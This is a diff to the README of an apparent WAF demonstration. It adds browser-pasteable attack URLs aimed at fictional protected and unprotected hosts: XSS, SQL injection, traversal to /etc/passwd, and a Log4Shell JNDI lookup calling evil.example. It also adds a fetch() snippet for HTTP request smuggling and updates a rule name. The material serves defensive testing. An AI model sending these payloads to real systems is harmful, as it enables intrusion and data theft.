@@ -40,8 +40,7 @@ The **HTTP request smuggling** rule — a second request line pipelined in the b
 printf '%b' '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n' \
 | curl -i -H 'Content-Type: text/plain' --data-binary @- \
     https://payments-secure.fictionally.org/api/batch
-# → HTTP/2 403 ... x-waf-block: true
-#   x-waf-rule: VIOL_OPENAPI_PATH  (becomes waf-rule-smuggling-001 once the updated policy is imported — see note)
+# → HTTP/2 403 ... x-waf-block: true ... x-waf-rule: waf-rule-smuggling-001
 ```
 
 **One command, several checks** — the bundled `curl`-only smoke test (no Python/deps),
@@ -55,18 +54,52 @@ traffic (`200`):
 #   [PASS] SQLi UNION            expect=block status=403  rule=waf-rule-sqli-001
 #   [PASS] Path traversal        expect=block status=403  rule=waf-rule-lfi-001
 #   [PASS] Log4Shell JNDI        expect=block status=403  rule=waf-rule-ssrf-002
-#   [PASS] HTTP req smuggling    expect=block status=403  rule=VIOL_OPENAPI_PATH
+#   [PASS] HTTP req smuggling    expect=block status=403  rule=waf-rule-smuggling-001
 #   [PASS] Benign request        expect=allow status=200
 #   6 passed, 0 failed
 ./test-secure.sh https://payments-secure.fictionally.org   # or pass an explicit host
 ```
 
+### From a browser
+
+The WAF inspects the URL, so **GET** attacks trigger a block you can *see* — paste one
+into the address bar and you get the branded **403 “Request blocked”** page (with a
+Support ID) instead of the app:
+
+```
+https://payments-secure.fictionally.org/search?q=<script>alert(1)</script>
+https://payments-secure.fictionally.org/products?cat=x' UNION SELECT * FROM users--
+https://payments-secure.fictionally.org/statement?file=../../../../etc/passwd
+https://payments-secure.fictionally.org/lookup?user=${jndi:ldap://evil.example/a}
+```
+
+Open the **same URL on the unprotected host** to see the “before” — the origin processes
+it: `https://payments-open.fictionally.org/search?q=<script>alert(1)</script>`.
+
+To confirm it was the WAF (not the app), open **DevTools → Network**, click the request,
+and read the response headers: `x-waf-block: true`, `x-waf-rule: …`, `x-support-id: …`.
+
+POST-only attacks (smuggling, NoSQLi, mass-assignment) aren’t reachable from the address
+bar — run them from the **DevTools Console** with `fetch()`. The HTTP request smuggling one:
+
+```js
+fetch("https://payments-secure.fictionally.org/api/batch", {
+  method: "POST", headers: {"Content-Type": "text/plain"},
+  body: '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n'
+}).then(r => console.log(r.status, r.headers.get("x-waf-rule")));
+// → 403 waf-rule-smuggling-001
+```
+
+(The block page itself is served for navigations; for `fetch()` the browser exposes the
+status and the `x-waf-*` headers as above.)
+
 > Note: the smoke test only asserts *blocked* (`403` + `X-WAF-Block`), not which rule.
-> Until the updated policy is (re-)imported to the edge, the smuggling payload is stopped
-> by the OpenAPI positive-security stage (`/api/batch` is an undeclared endpoint,
-> `VIOL_OPENAPI_PATH`); once imported, the same request is stopped by `waf-rule-smuggling-001`.
-> Both are a `403` block, so the test passes either way. For the full assertion matrix
-> (which rule fired, plus the open-host control) use `test_waf_live.py` below.
+> The updated policy is imported to the live edge, so the smuggling payload is stopped by
+> `waf-rule-smuggling-001`. (On an edge that hasn't imported it yet, an undeclared
+> `/api/batch` is instead stopped by the OpenAPI positive-security stage,
+> `VIOL_OPENAPI_PATH` — both are a `403` block, so the test passes either way.) For the
+> full assertion matrix (which rule fired, plus the open-host control) use
+> `test_waf_live.py` below.
 
 ## Result (20 attacks)
 
